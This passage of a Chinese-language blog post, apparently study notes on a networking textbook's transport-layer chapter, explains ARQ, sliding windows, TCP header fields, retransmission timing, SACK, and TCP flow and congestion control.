src="/2024/06/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC5%E7%AB%A0%EF%BC%9A%E4%BC%A0%E8%BE%93%E5%B1%82/image_nwLTPk_bDe.png"></p><p>当B回复的确认M1丢失后，会收到重复的M1，这次应采取两个动作：</p><ol><li>丢弃这个重复的分组M1，不向上层重复交付</li><li>向A发送确认</li></ol><p>当A收到B回复的重复确认后，就收下进行丢弃，什么也不做。</p><p>使用上述的确认和重传机制，我们就可以在不可靠的传输网络上实现可靠的通信。</p><p>这种可靠传输协议常称为<strong>自动重传请求ARQ</strong> (Automatic Repeat reQuest)。ARQ 表明重传的请求是自动进行的。接收方不需要请求发送方重传某个出错的分组 。</p><h3 id="4-1-3-信道利用率"><a href="#4-1-3-信道利用率" class="headerlink" title="4.1.3 信道利用率"></a>4.1.3 信道利用率</h3><p>停止等待协议的优点是简单，但缺点是信道利用率太低。&#x20;</p><p><img src="/2024/06/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC5%E7%AB%A0%EF%BC%9A%E4%BC%A0%E8%BE%93%E5%B1%82/image_UGDGdo9jhz.png"></p><p>信道的利用率U计算如下：</p><p>$$<br>U&#x3D;\frac{T_{D}}{T_{D}+\mathrm{RTT}+T_{A}}<br>$$</p><p>上式的往返时间RTT取决于所使用的信道。例如，假定1200km的信道的往返时间RTT&#x3D;20ms，分组长度是1200bit，发送速率是1Mbit&#x2F;s。若忽略处理时间和Ta（Ta一般都远小于Td），则可算出信道的利用率U&#x3D;5.66%。</p><p>但若把发送速率提高到10Mbit&#x2F;s，则$U&#x3D;5.96 ×10^{-3}$，信道在绝大多数时间内都是空闲的。</p><h3 id="4-1-4-流水线传输"><a href="#4-1-4-流水线传输" class="headerlink" title="4.1.4 流水线传输"></a>4.1.4 流水线传输</h3><p>发送方可连续发送多个分组，不必每发完一个分组就停顿下来等待对方的确认。由于信道上一直有数据不间断地传送，这种传输方式可获得很高的信道利用率。&#x20;</p><p><img src="/2024/06/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC5%E7%AB%A0%EF%BC%9A%E4%BC%A0%E8%BE%93%E5%B1%82/image_wWMDyfjlo0.png"></p><p>当使用流水线传输时，就要使用下面介绍的连续ARQ协议和滑动窗口协议。</p><h2 id="4-2-连续-ARQ-协议"><a href="#4-2-连续-ARQ-协议" class="headerlink" title="4.2 连续 ARQ 协议"></a>4.2 连续 ARQ 协议</h2><p><img src="/2024/06/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC5%E7%AB%A0%EF%BC%9A%E4%BC%A0%E8%BE%93%E5%B1%82/image_6cKyJTfVaI.png"></p><p>位于发送窗口内的5个分组都可以连续发送出去，而不需要等待对方的确认。</p><p>连续ARQ协议规定，发送方每收到一个确认，就把发送窗口向前滑动一个分组的位置。</p><p>接收方一般采用累积确认的方式。即不必对收到的分组逐个发送确认，而是对按序到达的最后一个分组发送确认，这样就表示：到这个分组为止的所有分组都已正确收到了。</p><p>累积确认的优点：容易实现，即使确认丢失也不必重传。缺点是：不能向发送方反映出接收方已经正确收到的所有分组的信息。</p><h3 id="4-2-1-Go-back-N（回退-N）"><a href="#4-2-1-Go-back-N（回退-N）" class="headerlink" title="4.2.1 Go-back-N（回退 N）"></a>4.2.1 Go-back-N（回退 N）</h3><p>如果发送方发送了前 5 个分组，而中间的第 3 个分组丢失了。这时接收方只能对前两个分组发出确认。发送方无法知道后面三个分组的下落，而只好把后面的三个分组都再重传一次。</p><p>这就叫做 <strong>Go-back-N</strong>（回退 N），表示需要再退回来重传已发送过的 N 个分组。<br>可见当通信线路质量不好时，连续 ARQ 协议会带来负面的影响。&#x20;</p><hr><h1 id="5-TCP-报文段的首部格式"><a href="#5-TCP-报文段的首部格式" class="headerlink" title="5 TCP 报文段的首部格式"></a>5 TCP 报文段的首部格式</h1><p><img src="/2024/06/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC5%E7%AB%A0%EF%BC%9A%E4%BC%A0%E8%BE%93%E5%B1%82/image_RTqbYt_RRx.png"></p><h2 id="5-1-首部各个字段的含义"><a href="#5-1-首部各个字段的含义" class="headerlink" title="5.1 首部各个字段的含义"></a>5.1 首部各个字段的含义</h2><h3 id="5-1-1-源端口和目的端口"><a href="#5-1-1-源端口和目的端口" class="headerlink" title="5.1.1 源端口和目的端口"></a>5.1.1 源端口和目的端口</h3><p>各占 2 字节。端口是运输层与应用层的服务接口。</p><p>运输层的复用和分用功能都要通过端口才能实现。 &#x20;</p><h3 id="5-1-2-序号"><a href="#5-1-2-序号" class="headerlink" title="5.1.2 序号"></a>5.1.2 序号</h3><p>占 4 字节。TCP 连接中传送的数据流中的每一个字节都编上一个序号。</p><p>序号字段的值则指的是本报文段所发送的数据的第一个字节的序号。&#x20;</p><h3 id="5-1-3-确认号"><a href="#5-1-3-确认号" class="headerlink" title="5.1.3 确认号"></a>5.1.3 确认号</h3><p>占 4 字节，是期望收到对方的下一个报文段的数据的第一个字节的序号。</p><h3 id="5-1-4-数据偏移（即首部长度）"><a href="#5-1-4-数据偏移（即首部长度）" class="headerlink" title="5.1.4 数据偏移（即首部长度）"></a>5.1.4 数据偏移（即首部长度）</h3><p>占 4 位，它指出 TCP 报文段的数据起始处距离 TCP 报文段的起始处有多远。</p><p>“数据偏移”的单位是 32 位字（以 4 字节为计算单位）。</p><h3 id="5-1-5-保留"><a href="#5-1-5-保留" class="headerlink" title="5.1.5 保留"></a>5.1.5 保留</h3><p>占 6 位，保留为今后使用，但目前应置为0。</p><h3 id="5-1-6-紧急-URG-x20"><a href="#5-1-6-紧急-URG-x20" class="headerlink" title="5.1.6 紧急 URG&#x20;"></a>5.1.6 紧急 URG&#x20;</h3><p>当 URG &#x3D; 1 时，表明紧急指针字段有效。它告诉系统此报文段中有紧急数据，应尽快传送(相当于高优先级的数据)。&#x20;</p><h3 id="5-1-7-确认-ACK"><a href="#5-1-7-确认-ACK" class="headerlink" title="5.1.7 确认 ACK"></a>5.1.7 确认 ACK</h3><ul><li>只有当 ACK &#x3D; 1 时确认号字段才有效。</li><li>当 ACK &#x3D; 0 时，确认号无效。</li></ul><p>TCP规定,在连接建立后所有传送的报文段都必须把ACK置为１。</p><h3 id="5-1-8-推送-PSH"><a href="#5-1-8-推送-PSH" class="headerlink" title="5.1.8 推送 PSH"></a>5.1.8 推送 PSH</h3><p>当两个应用进程进行交互式的通信时,有时在一端的应用进程希望在键入一个命令后立即能够收到对方的响应，可以使用push操作。</p><p>接收 TCP 收到 PSH &#x3D; 1 的报文段，就尽快地交付接收应用进程，而不再等到整个缓存都填满了后再向上交付。 &#x20;</p><p>虽然应用进程可以选择推送操作，但推送操作很少使用。</p><h3 id="5-1-9-复位-RST"><a href="#5-1-9-复位-RST" class="headerlink" title="5.1.9 复位 RST"></a>5.1.9 复位 RST</h3><p>当 RST &#x3D; 1 时，表明 TCP 连接中出现严重差错（如由于主机崩溃或其他原因），必须释放连接，然后再重新建立运输连接。</p><p>RST &#x3D; 1还用来拒绝一个非法的报文段或拒绝打开一个连接，RST也可称为重建位或重置位。</p><h3 id="5-1-10-同步-SYN"><a href="#5-1-10-同步-SYN" class="headerlink" title="5.1.10 同步 SYN"></a>5.1.10 同步 SYN</h3><p>同步 SYN &#x3D; 1 表示这是一个连接请求或连接接受报文。对方若同意建立连接，则应在响应的报文段中使用SYN &#x3D; 1和ACK &#x3D; 1。</p><h3 id="5-1-11-终止-FIN"><a href="#5-1-11-终止-FIN" class="headerlink" title="5.1.11 终止 FIN"></a>5.1.11 终止 FIN</h3><p>用来释放一个连接。FIN &#x3D; 1 表明此报文段的发送端的数据已发送完毕，并要求释放运输连接。</p><h3 id="5-1-12-窗口字段"><a href="#5-1-12-窗口字段" class="headerlink" title="5.1.12 窗口字段"></a>5.1.12 窗口字段</h3><p>占 2 字节，用来让对方设置发送窗口的依据，单位为字节。</p><p>窗口值告诉对方：本报文段首部中的确认号算起，接收方目前允许对方发送的数据量（以字节为单位）。</p><h3 id="5-1-13-检验和"><a href="#5-1-13-检验和" class="headerlink" title="5.1.13 检验和"></a>5.1.13 检验和</h3><p>占 2 字节。检验和字段检验的范围包括首部和数据这两部分。在计算检验和时，要在 TCP 报文段的前面加上 12 字节的伪首部。</p><p>但把伪首部第4个字段中的17改为6（TCP的协议号为6）。</p><h3 id="5-1-14-紧急指针"><a href="#5-1-14-紧急指针" class="headerlink" title="5.1.14 紧急指针"></a>5.1.14 紧急指针</h3><p>占 16 位，指出在本报文段中紧急数据共有多少个字节（紧急数据放在本报文段数据的最前面）。</p><h3 id="5-1-15-选项"><a href="#5-1-15-选项" class="headerlink" title="5.1.15 选项"></a>5.1.15 选项</h3><p>长度可变。TCP 最初只规定了一种选项，即最大报文段长度 MSS。MSS 告诉对方 TCP：“我的缓存所能接收的报文段的<strong>数据字段</strong>的最大长度是 MSS 个字节。”&#x20;</p><h3 id="5-1-16-其他选项-xD"><a href="#5-1-16-其他选项-xD" class="headerlink" title="5.1.16 其他选项&#xD;"></a>5.1.16 其他选项&#xD;</h3><ul><li><p>窗口扩大选项 ——占 3 字节，其中有一个字节表示移位值 S。新的窗口值等于TCP 首部中的窗口位数增大到(16 + S)，相当于把窗口值向左移动 S 位后获得实际的窗口大小。</p></li><li><p>时间戳选项——占10 字节，其中最主要的字段时间戳值字段（4 字节）和时间戳回送回答字段（4 字节）。</p></li><li><p>选择确认选项——在后面的 5.6.3 节介绍。&#x20;</p></li></ul><p>时间戳选项有以下两个功能：</p><ol><li>用来计算往返时间RTT</li><li>用于处理TCP序号超过$2^{32}<br>$的情况，<strong>防止序号绕回</strong>PAWS。</li></ol><hr><h1 id="6-TCP-可靠传输的实现"><a href="#6-TCP-可靠传输的实现" class="headerlink" title="6 TCP 可靠传输的实现"></a>6 TCP 可靠传输的实现</h1><h2 id="6-1-以字节为单位的滑动窗口"><a href="#6-1-以字节为单位的滑动窗口" class="headerlink" title="6.1 以字节为单位的滑动窗口"></a>6.1 以字节为单位的滑动窗口</h2><p><img src="/2024/06/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC5%E7%AB%A0%EF%BC%9A%E4%BC%A0%E8%BE%93%E5%B1%82/image_nzUxWfT5Fg.png"></p><p><img src="/2024/06/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC5%E7%AB%A0%EF%BC%9A%E4%BC%A0%E8%BE%93%E5%B1%82/image_sqPvTZI9ss.png"></p><p><img src="/2024/06/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC5%E7%AB%A0%EF%BC%9A%E4%BC%A0%E8%BE%93%E5%B1%82/image_BEkdaJK56K.png"></p><p><img src="/2024/06/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC5%E7%AB%A0%EF%BC%9A%E4%BC%A0%E8%BE%93%E5%B1%82/image_IjbxyU7fuI.png"></p><h3 id="6-1-1-发送缓存"><a href="#6-1-1-发送缓存" class="headerlink" title="6.1.1 发送缓存"></a>6.1.1 发送缓存</h3><p><img src="/2024/06/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC5%E7%AB%A0%EF%BC%9A%E4%BC%A0%E8%BE%93%E5%B1%82/image_yvGWIguA6H.png"></p><p>发送缓存用来存放：</p><ol><li>发送应用进程传送给发送方TCP准备发送的数据</li><li>TCP已发送但尚未收到确认的数据</li></ol><h3 id="6-1-2-接收缓存"><a href="#6-1-2-接收缓存" class="headerlink" title="6.1.2 接收缓存"></a>6.1.2 接收缓存</h3><p><img src="/2024/06/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC5%E7%AB%A0%EF%BC%9A%E4%BC%A0%E8%BE%93%E5%B1%82/image_LNIsvM8rwy.png"></p><p>接收缓存用来暂时存放：</p><ol><li>按序到达的、但尚未被接收应用程序读取的数据</li><li>不按序到达的数据</li></ol><p>需要强调三点</p><ol><li><p>A 的发送窗口并不总是和 B 的接收窗口一样大（因为有一定的时间滞后）。</p></li><li><p>TCP 标准没有规定对不按序到达的数据应如何处理。通常是先临时存放在接收窗口中，等到字节流中所缺少的字节收到后，再按序交付上层的应用进程。</p></li><li><p>TCP 要求接收方必须有<strong>累积确认</strong>的功能，这样可以减小传输开销。 &#x20;</p></li></ol><p>TCP的通信是全双工通信，通信中的每一方都在发送和接受数据，因此每一方都有自己的发送窗口和接受窗口。</p><h2 id="6-2-超时重传时间的选择"><a href="#6-2-超时重传时间的选择" class="headerlink" title="6.2 超时重传时间的选择"></a>6.2 超时重传时间的选择</h2><p>重传机制是 TCP 中最重要和最复杂的问题之一。</p><p>TCP 每发送一个报文段，就对这个报文段设置一次计时器。只要计时器设置的重传时间到但还没有收到确认，就要重传这一报文段。</p><p>由于 TCP 的下层是一个互联网环境，IP 数据报所选择的路由变化很大。因而运输层的往返时间的方差也很大。</p><p><img src="/2024/06/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC5%E7%AB%A0%EF%BC%9A%E4%BC%A0%E8%BE%93%E5%B1%82/image_-KV1kWkATr.png"></p><p>TCP采用了一种自适应算法，它记录一个报文段发出的时间，以及收到响应的确认的时间，这两个时间之差就是报文段的往返时间RTT。</p><h3 id="6-2-1-加权平均往返时间-RTTS"><a href="#6-2-1-加权平均往返时间-RTTS" class="headerlink" title="6.2.1 加权平均往返时间 RTTS"></a>6.2.1 加权平均往返时间 RTTS</h3><p>TCP 保留了 RTT 的一个加权平均往返时间 RTTS（又称为平滑往返时间）。</p><p>第一次测量到 RTT 样本时，RTTS 值就取为所测量到的 RTT 样本值。以后每测量到一个新的 RTT 样本，就按下式重新计算一次 RTTS：</p><p>$$<br>新RTT_\mathbf{S}&#x3D;(\mathbf{1}-\alpha) \times\left(\right. 旧 \left.\mathbf{R T T}_{\mathbf{S}}\right)+\alpha \times( 新的 RTT 样本 )<br>$$</p><p>式中，$0 \leq \alpha&lt;1$。若 α 很接近于零，表示 RTT 值更新较慢。若选择 α 接近于 1，则表示 RTT 值更新较快。RFC 2988 推荐的 α 值为 1&#x2F;8，即 0.125。</p><h3 id="6-2-2-超时重传时间RTO"><a href="#6-2-2-超时重传时间RTO" class="headerlink" title="6.2.2 超时重传时间RTO"></a>6.2.2 超时重传时间RTO</h3><p>显然RTO应该略大于上面得到的RTTs，RFC 2988 建议使用下式计算 RTO：</p><p>$$<br>{R T O}&#x3D;{R T T s}+4 \times {RTT}_{D}<br>$$</p><ul><li>RTTD是RTT 的偏差的加权平均值。</li></ul><p>RFC 2988 建议这样计算 RTTD。第一次测量时，RTTD 值取为测量到的 RTT 样本值的一半。在以后的测量中，则使用下式计算加权平均的 RTTD：</p><p>$$<br>新的RTT_{D}&#x3D;(1-\beta) \times(旧的RTT_{D})+\beta \times \mid R_{S}- 新的 RTT 样本 \mid<br>$$</p><ul><li>β 是个小于 1 的系数，其推荐值是 1&#x2F;4，即 0.25。</li></ul><h3 id="6-2-3-Karn-算法"><a href="#6-2-3-Karn-算法" class="headerlink" title="6.2.3 Karn 算法"></a>6.2.3 Karn 算法</h3><p>TCP 报文段没有收到对应的确认，则重传，之后收到了确认报文段 ACK。</p><p>那么，问题是：该确认报文段 ACK报文段的确认，还是对其重传报文段的确认呢 ？&#x20;</p><p><img src="/2024/06/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC5%E7%AB%A0%EF%BC%9A%E4%BC%A0%E8%BE%93%E5%B1%82/image_7zjfoNbGQv.png"></p><p>采用Karm算法，即在计算平均往返时间 RTT 时，只要报文段重传了，就不采用其往返时间样本。这样得出的加权平均平均往返时间 RTTS 和超时重传时间 RTO 就较准确。&#x20;</p><h3 id="6-2-4-修正的-Karn-算法"><a href="#6-2-4-修正的-Karn-算法" class="headerlink" title="6.2.4 修正的 Karn 算法"></a>6.2.4 修正的 Karn 算法</h3><p>但是如果报文段的时延突然增大了很多，如果报文段重传了而不采用其往返时间样本，无法更新超时重传时间。</p><p>报文段每重传一次，就把 RTO 增大一些：</p><p>$$<br>新的 RTO &#x3D;\gamma \times (旧的 RTO)<br>$$</p><ul><li>系数 γ 的典型值是 2 。</li></ul><p>当不再发生报文段的重传时，才根据报文段的RTT更新RTTS 和RTO 。实践证明，这种策略较为合理。&#x20;</p><h2 id="6-3-选择确认-SACK"><a href="#6-3-选择确认-SACK" class="headerlink" title="6.3 选择确认 SACK"></a>6.3 选择确认 SACK</h2><p>接收方收到了和前面的字节流不连续的两个字节块。</p><p>如果这些字节的序号都在接收窗口之内，那么接收方就先收下这些数据，但要把这些信息准确地告诉发送方，使发送方不要再重复发送这些已收到的数据。&#x20;</p><p><img src="/2024/06/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC5%E7%AB%A0%EF%BC%9A%E4%BC%A0%E8%BE%93%E5%B1%82/image_OIAGvUvEzw.png"></p><p>和前后字节不连续的每一个字节块都有两个边界：左边界和右边界。图中用四个指针标记这些边界。</p><ol><li><p>第一个字节块的左边界 L1 &#x3D; 1501，但右边界 R1 &#x3D; 3001。</p><p>左边界指出字节块的第一个字节的序号，但右边界减 1 才是字节块中的最后一个序号。</p></li><li><p>第二个字节块的左边界 L2 &#x3D; 3501，而右边界 R2 &#x3D; 4501。&#x20;</p></li></ol><p>如果要使用选择确认，那么在建立 TCP 连接时，就要在 TCP 首部的选项中加上“允许 SACK”的选项，而双方必须都事先商定好。</p><p>如果使用选择确认，那么原来首部中的“确认号字段”的用法仍然不变。只是以后在 TCP 报文段的首部中都增加了 SACK 选项，以便报告收到的不连续的字节块的边界。</p><p>由于首部选项的长度最多只有 40 字节，而指明一个边界就要用掉 4 字节，因此在选项中最多只能指明 4 个字节块的边界信息。</p><hr><h1 id="7-TCP-的流量控制"><a href="#7-TCP-的流量控制" class="headerlink" title="7 TCP 的流量控制"></a>7 TCP 的流量控制</h1><h2 id="7-1-利用滑动窗口实现流量控制"><a href="#7-1-利用滑动窗口实现流量控制" class="headerlink" title="7.1 利用滑动窗口实现流量控制"></a>7.1 利用滑动窗口实现流量控制</h2><p>一般说来，我们总是希望数据传输得更快一些。但如果发送方把数据发送得过快，接收方就可能来不及接收，这就会造成数据的丢失。</p><p>流量控制（flow control）就是让发送方的发送速率不要太快，既要让接收方来得及接收，也不要使网络发生拥塞。</p><p>利用滑动窗口机制可以很方便地在 TCP 连接上实现流量控制。&#x20;</p><h3 id="7-1-1-流量控制举例-xD"><a href="#7-1-1-流量控制举例-xD" class="headerlink" title="7.1.1 流量控制举例&#xD;"></a>7.1.1 流量控制举例&#xD;</h3><p>A 向 B 发送数据。</p><p>在连接建立时，B 告诉 A：“我的接收窗口 rwnd &#x3D; 400（字节）”。</p><p><img src="/2024/06/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC5%E7%AB%A0%EF%BC%9A%E4%BC%A0%E8%BE%93%E5%B1%82/image_KYyIbIX9BY.png"></p><hr><h1 id="8-TCP的拥塞控制"><a href="#8-TCP的拥塞控制" class="headerlink" title="8 TCP的拥塞控制"></a>8 TCP的拥塞控制</h1><h2 id="8-1-拥塞控制的一般原理"><a href="#8-1-拥塞控制的一般原理" class="headerlink" title="8.1 拥塞控制的一般原理"></a>8.1 拥塞控制的一般原理</h2><p>在某段时间，若对网络中某资源的需求超过了该资源所能提供的可用部分，网络的性能就要变坏——产生拥塞(congestion)。</p><p>出现资源拥塞的条件：</p><blockquote><p>对资源需求的总和 &gt; 可用资源</p></blockquote><p>若网络中有许多资源同时产生拥塞，网络的性能就要明显变坏，整个网络的吞吐量将随输入负荷的增大而下降。 &#x20;</p><p>拥塞控制是很难设计的，因为它是一个动态的（而不是静态的）问题。</p><p>当前网络正朝着高速化的方向发展，这很容易出现缓存不够大而造成分组的丢失。但分组的丢失是网络发生拥塞的征兆而不是原因。</p><p>在许多情况下，甚至正是拥塞控制本身成为引起网络性能恶化甚至发生死锁的原因。这点应特别引起重视。&#x20;</p><h3 id="8-1-1-开环和闭环控制"><a href="#8-1-1-开环和闭环控制" class="headerlink" title="8.1.1 开环和闭环控制"></a>8.1.1 开环和闭环控制</h3><ul><li><strong>开环控制</strong>方法就是在设计网络时事先将有关发生拥塞的因素考虑周到，力求网络在工作时不产生拥塞。&#x20;</li><li><strong>闭环控制</strong>是基于反馈环路的概念。属于闭环控制的有以下几种措施：&#x20;<br>监测网络系统以便检测到拥塞在何时、何处发生。<ul><li>将拥塞发生的信息传送到可采取行动的地方。</li><li>调整网络系统的运行以解决出现的问题。</li></ul></li></ul><h3 id="8-1-2-拥塞控制与流量控制的关系"><a href="#8-1-2-拥塞控制与流量控制的关系" class="headerlink" title="8.1.2 拥塞控制与流量控制的关系"></a>8.1.2 拥塞控制与流量控制的关系</h3><p>拥塞控制所要做的都有一个前提，就是网络能够承受现有的网络负荷。</p><p>拥塞控制是一个全局性的过程，涉及到所有的主机、所有的路由器，以及与降低网络传输性能有关的所有因素。&#x20;</p><p>流量控制往往指在给定的发送端和接收端之间的点对点通信量的控制。&#x20;</p><p>流量控制所要做的就是抑制发送端发送数据的速率，以便使接收端来得及接收。&#x20;</p><h2 id="8-2-TCP的拥塞控制方法"><a href="#8-2-TCP的拥塞控制方法" class="headerlink" title="8.2 TCP的拥塞控制方法"></a>8.2 TCP的拥塞控制方法</h2><p>TCP进行拥塞控制的算法有四种：慢开始、拥塞避免、快重传和快恢复。</p><h3 id="8-2-1-慢开始"><a href="#8-2-1-慢开始" class="headerlink" title="8.2.1 慢开始"></a>8.2.1 慢开始</h3><p>发送方维持一个叫做拥塞窗口 cwnd（congestion window）的状态变量。拥塞窗口的大小取决于网络的拥塞程度，并且动态地在变化。发送方让自己的发送窗口等于拥塞窗口。如再考虑到接收方的接收能力，则发送窗口还可能小于拥塞窗口。</p><p><strong>发送方控制拥塞窗口的原则是</strong>：只要网络没有出现拥塞，拥塞窗口就再增大一些，以便把更多的分组发送出去。但只要网络出现拥塞，拥塞窗口就减小一些，以减少注入到网络中的分组数。&#x20;</p><h4 id="8-2-1-1-慢开始算法的原理"><a href="#8-2-1-1-慢开始算法的原理" class="headerlink" title="8.2.1.1 慢开始算法的原理"></a>8.2.1.1 慢开始算法的原理</h4><ol><li><p>在主机刚刚开始发送报文段时可先设置拥塞窗口 cwnd &#x3D; 1，即设置为一个最大报文段 MSS 的数值。</p></li><li><p>在每收到一个对新的报文段的确认后，将拥塞窗口加 1，即增加一个 MSS 的数值。</p></li><li><p>用这样的方法逐步增大发送端的拥塞窗口 cwnd，可以使分组注入到网络的速率更加合理。&#x20;</p></li></ol><p><img src="/2024/06/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC5%E7%AB%A0%EF%BC%9A%E4%BC%A0%E8%BE%93%E5%B1%82/image_BqS15bXn_m.png"></p><h4 id="8-2-1-2-传输轮次"><a href="#8-2-1-2-传输轮次" class="headerlink" title="8.2.1.2 传输轮次"></a>8.2.1.2 传输轮次</h4><p>使用慢开始算法后，每经过一个传输轮次，拥塞窗口 cwnd 就加倍。</p><p>一个传输轮次所经历的时间其实就是往返时间 RTT。</p><p><strong>“传输轮次”更加强调</strong>：把拥塞窗口 cwnd 所允许发送的报文段都连续发送出去，并收到了对已发送的最后一个字节的确认。</p><p>例如，拥塞窗口 cwnd &#x3D; 4，这时的往返时间 RTT 就是发送方连续发送 4 个报文段，并收到这 4 个报文段的确认，总共经历的时间。&#x20;</p><p>由此可见，慢开始的“慢”并不是cwnd的增长速率慢，而是指在TCP开始发送报文段时，只发送一个报文段，即设置cwnd &#x3D; 1，目的是试探一下网络的拥塞情况，然后视情况再逐渐增大cwnd。</p><h3 id="8-2-2-拥塞避免"><a href="#8-2-2-拥塞避免" class="headerlink" title="8.2.2 拥塞避免"></a>8.2.2 拥塞避免</h3><p>为了防止拥塞窗口cwnd增长过大引起网络拥塞，还需要设置一个慢开始门限ssthresh状态变量，慢开始门限 ssthresh 的用法如下：</p><ol><li><p>当 cwnd &lt; ssthresh 时，使用慢开始算法。</p></li><li><p>当 cwnd &gt; ssthresh 时，停止使用慢开始算法而改用拥塞避免算法。</p></li><li><p>当 cwnd &#x3D; ssthresh 时，既可使用慢开始算法，也可使用拥塞避免算法。</p></li></ol><p>拥塞避免算法的思路是让拥塞窗口 cwnd 缓慢地增大，即每经过一个往返时间 RTT 就把发送方的拥塞窗口 cwnd 加 1，而不是加倍，使拥塞窗口 cwnd 按线性规律缓慢增长。</p><p>无论在慢开始阶段还是在拥塞避免阶段，只要发送方判断网络出现拥塞（其根据就是没有按时收到确认），就要把慢开始门限 ssthresh 设置为出现拥塞时的<strong>发送方窗口值的一半</strong>（但不能小于2）。然后把拥塞窗口 cwnd 重新设置为 1，执行慢开始算法。</p><p>这样做的目的就是要迅速减少主机发送到网络中的分组数，使得发生拥塞的路由器有足够时间把队列中积压的分组处理完毕。&#x20;</p><h3 id="8-2-3-慢开始和拥塞避免算法的实现举例"><a href="#8-2-3-慢开始和拥塞避免算法的实现举例" class="headerlink" title="8.2.3 慢开始和拥塞避免算法的实现举例"></a>8.2.3 慢开始和拥塞避免算法的实现举例</h3><p>当 TCP 连接进行初始化时，将拥塞窗口置为 1。下图中的窗口单位不使用字节而使用报文段。</p><p>慢开始门限的初始值设置为 16 个报文段，即 ssthresh &#x3D; 16。</p><p>发送端的发送窗口不能超过拥塞窗口 cwnd 和接收端窗口 rwnd 中的最小值。我们假定接收端窗口足够大，因此现在发送窗口的数值等于拥塞窗口的数值。</p><p><img src="/2024/06/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC5%E7%AB%A0%EF%BC%9A%E4%BC%A0%E8%BE%93%E5%B1%82/image_D315wWkKOI.png"></p><p>在执行慢开始算法时，拥塞窗口 cwnd 的初始值为 1，发送第一个报文段 M0。 &#x20;</p><p>发送端每收到一个确认 ，就把 cwnd 加 1。于是发送端可以接着发送 M1 和 M2 两个报文段。&#x20;</p><p>接收端共发回两个确认。发送端每收到一个对新报文段的确认，就把发送端的 cwnd 加 1。现在 cwnd 从 2 增大到 4，并可接着发送后面的 4 个报文段。&#x20;</p><p>发送端每收到一个对新报文段的确认，就把发送端的拥塞窗口加 1，因此拥塞窗口 cwnd 随着传输轮次按指数规律增长。&#x20;</p><p>当拥塞窗口 cwnd 增长到慢开始门限值 ssthresh 时（即当 cwnd &#x3D; 16 时），就改为执行拥塞避免算法，拥塞窗口按线性规律增长。&#x20;</p><p>假定拥塞窗口的数值增长到 24 时，网络出现超时，表明网络拥塞了。&#x20;</p><p>更新后的 ssthresh 值变为 12（即发送窗口数值 24 的一半），拥塞窗口再重新设置为 1，并执行慢开始算法。&#x20;</p><p>当 cwnd &#x3D; 12 时改为执行拥塞避免算法，拥塞窗口按按线性规律增长，每经过一个往返时延就增加一个 MSS 的大小。</p><h4 id="8-2-3-1-乘法减小"><a href="#8-2-3-1-乘法减小" class="headerlink" title="8.2.3.1 乘法减小"></a>8.2.3.1 乘法减小</h4><p>“乘法减小“是指不论在慢开始阶段还是拥塞避免阶段，只要出现一次超时（即出现一次网络拥塞），就把慢开始门限值 ssthresh 设置为当前的拥塞窗口值乘以 0.5。</p><p>当网络频繁出现拥塞时，ssthresh 值就下降得很快，以大大减少注入到网络中的分组数。&#x20;</p><h4 id="8-2-3-2-加法增大"><a href="#8-2-3-2-加法增大" class="headerlink" title="8.2.3.2 加法增大"></a>8.2.3.2 加法增大</h4><p>“加法增大”是指执行拥塞避免算法后，在收到对所有报文段的确认后（即经过一个往返时间），就把拥塞窗口 cwnd增加一个 MSS 大小，使拥塞窗口缓慢增大，以防止网络过早出现拥塞。&#x20;</p><p>加法增大和乘法减小合在一起称为<code>AIMD</code>算法。</p><h3 id="8-2-4-快重传"><a href="#8-2-4-快重传" class="headerlink" title="8.2.4 快重传"></a>8.2.4 快重传</h3><p>快重传算法首先要求接收方每收到一个失序的报文段后就立即发出重复确认。这样做可以让发送方及早知道有报文段没有到达接收方。&#x20;</p><p>发送方只要一连收到三个重复确认就应当立即重传对方尚未收到的报文段。&#x20;</p><p>不难看出，快重传并非取消重传计时器，而是在某些情况下可更早地重传丢失的报文段。&#x20;</p><p><img src="/2024/06/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC5%E7%AB%A0%EF%BC%9A%E4%BC%A0%E8%BE%93%E5%B1%82/image_etjH2VOgvP.png"></p><h3 id="8-2-5-快恢复"><a href="#8-2-5-快恢复" class="headerlink" title="8.2.5 快恢复"></a>8.2.5 快恢复</h3><ol><li><p>当发送端收到连续三个重复的确认时，就执行“乘法减小”算法，把慢开始门限 ssthresh 减半。但接下去不执行慢开始算法。&#x20;</p></li><li><p>由于发送方现在认为网络很可能没有发生拥塞，因此现在不执行慢开始算法，即拥塞窗口 cwnd 现在不设置为 1，而是设置为慢开始门限 ssthresh 减半后的数值，然后开始执行拥塞避免算法（“加法增大”），使拥塞窗口缓慢地线性增大。&#x20;</p></li></ol><p><img 